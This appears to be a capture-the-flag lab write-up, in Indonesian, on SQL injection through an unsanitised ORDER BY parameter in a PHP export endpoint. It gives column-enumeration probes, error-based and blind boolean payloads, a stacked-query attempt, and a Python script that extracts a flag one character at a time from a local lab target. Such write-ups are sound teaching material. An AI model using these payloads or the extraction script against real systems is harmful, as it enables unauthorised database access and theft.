# Lab M5 - Order By SQL Injection (Medium)

## Informasi Lab
- **Endpoint**: `/export.php?id=1&sort=`
- **Tipe**: Order By Injection
- **Hint**: Sorting issue - order by idx

## Analisis

### 1. Parameter Sorting
```
?id=1&sort=id
?id=1&sort=file
```
Query:
```sql
SELECT id,file FROM exports WHERE id = $id ORDER BY $sort
```

### 2. Kerentanan di ORDER BY
Parameter `sort` langsung dimasukkan ke ORDER BY tanpa sanitasi.

## Solusi

### Langkah 1 - Test Column Enumeration
```
?sort=1  (kolom pertama - id)
?sort=2  (kolom kedua - file)
?sort=3  (error = hanya 2 kolom)
```

### Langkah 2 - Error Based via ORDER BY
```
?sort=(SELECT IF(1=1,id,(SELECT 1 UNION SELECT 2)))
```

### Langkah 3 - Blind via ORDER BY
```
?sort=(SELECT IF(ASCII(SUBSTRING((SELECT flag FROM flags LIMIT 1),1,1))>64,id,file))
```
Jika true, akan sort by id, jika false sort by file.

### Script Python

```python
import requests

url = "http://localhost/m5/export.php"
base_params = {"id": "1"}

def check(condition):
    params = base_params.copy()
    params["sort"] = f"(SELECT IF({condition},id,file))"
    r = requests.get(url, params=params)
    # Analisa response untuk menentukan sort order
    return "report_q1.pdf" in r.text  # asumsi hasil sort

# Get flag
flag = ""
charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}IDS"

for i in range(1, 20):
    for c in charset:
        condition = f"ASCII(SUBSTRING((SELECT flag FROM flags LIMIT 1),{i},1))={ord(c)}"
        if check(condition):
            flag += c
            print(f"Flag: {flag}")
            break

print(f"\nFinal Flag: {flag}")
```

### Metode Alternatif - UNION di ORDER BY
```
?sort=id;SELECT flag FROM flags LIMIT 1
```
(Tergantung apakah stacked query didukung)

### Metode Error Based
```
?sort=IF(1=1,1,EXP(999))
?sort=EXTRACTVALUE(1,CONCAT(0x7e,(SELECT flag FROM flags LIMIT 1)))
```

### Flag
```
IDS{XXXXXXXXXXXXXX}
```

## Tips
- ORDER BY injection sering terlewat
- Bisa digunakan untuk blind atau error based
- Perhatikan perubahan urutan data untuk blind injection
